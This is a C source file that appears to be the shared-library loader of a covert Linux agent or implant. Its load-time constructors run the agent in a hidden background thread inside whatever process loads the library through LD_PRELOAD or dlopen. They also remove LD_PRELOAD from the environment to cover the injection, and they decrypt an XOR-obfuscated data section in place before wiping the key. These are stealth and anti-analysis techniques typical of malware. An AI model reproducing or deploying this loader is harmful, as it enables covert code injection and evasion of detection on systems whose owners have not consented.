/* nax_linux/src/shared.c — Shared library (.so) entry point
 *
 * When loaded via dlopen() or LD_PRELOAD, the constructor spawns
 * agent_run() in a detached thread so the host process is not blocked.
 *
 * The .rodata section is XOR-encrypted at build time by rodata_crypt.py.
 * A priority-101 constructor decrypts it in-place before the agent starts.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <link.h>

extern int agent_run(void);

__attribute__((visibility("default"))) unsigned char __rodata_xor_key[32]  = {1};
__attribute__((visibility("default"))) unsigned long __rodata_xor_len      = 1;
__attribute__((visibility("default"))) unsigned long __rodata_xor_addr     = 1;

/* We place a unique marker in .data (not .rodata) so we can find ourselves */
__attribute__((visibility("default"))) unsigned long __rodata_marker = 0xDEAD1234CAFE5678ULL;

static void *_agent_thread(void *arg)
{
    (void)arg;
    agent_run();
    return NULL;
}

/* Callback for dl_iterate_phdr — find our own base by checking if
 * __rodata_marker lives within this module's address range */
struct find_ctx { unsigned long base; };

static int _find_self_cb(struct dl_phdr_info *info, size_t size, void *data)
{
    (void)size;
    struct find_ctx *ctx = (struct find_ctx *)data;
    unsigned long marker_addr = (unsigned long)&__rodata_marker;

    for (int i = 0; i < info->dlpi_phnum; i++) {
        if (info->dlpi_phdr[i].p_type != PT_LOAD) continue;
        unsigned long seg_start = info->dlpi_addr + info->dlpi_phdr[i].p_vaddr;
        unsigned long seg_end = seg_start + info->dlpi_phdr[i].p_memsz;
        if (marker_addr >= seg_start && marker_addr < seg_end) {
            ctx->base = info->dlpi_addr;
            return 1; /* stop iterating */
        }
    }
    return 0;
}

__attribute__((constructor(101)))
static void _rodata_decrypt(void)
{
    if (__rodata_xor_len < 64) return;

    /* Find our own load base using dl_iterate_phdr */
    struct find_ctx ctx = {0};
    dl_iterate_phdr(_find_self_cb, &ctx);
    if (!ctx.base) return;

    unsigned char *rodata = (unsigned char *)(ctx.base + __rodata_xor_addr);
    unsigned long len = __rodata_xor_len;

    unsigned long page_size = 4096;
    unsigned long page_start = (unsigned long)rodata & ~(page_size - 1);
    unsigned long page_end = ((unsigned long)rodata + len + page_size - 1) & ~(page_size - 1);

    if (mprotect((void *)page_start, page_end - page_start, PROT_READ | PROT_WRITE) != 0)
        return;

    for (unsigned long i = 0; i < len; i++)
        rodata[i] ^= __rodata_xor_key[i % 32];

    mprotect((void *)page_start, page_end - page_start, PROT_READ);

    for (int i = 0; i < 32; i++)
        ((volatile unsigned char *)__rodata_xor_key)[i] = 0;
}

__attribute__((constructor))
static void _agent_init(void)
{
    unsetenv("LD_PRELOAD");

    pthread_t tid;
    if (pthread_create(&tid, NULL, _agent_thread, NULL) == 0)
        pthread_detach(tid);
}
